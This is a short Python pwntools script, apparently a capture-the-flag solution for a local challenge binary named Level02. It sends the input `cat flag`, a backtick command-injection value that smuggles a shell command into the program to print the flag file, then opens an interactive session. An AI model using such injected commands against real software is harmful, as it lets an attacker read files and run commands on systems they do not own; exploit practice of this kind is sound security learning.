from pwn import*

p = process('./Level02')

payload = b"`cat flag`"

p.sendline(payload)
p.interactive()
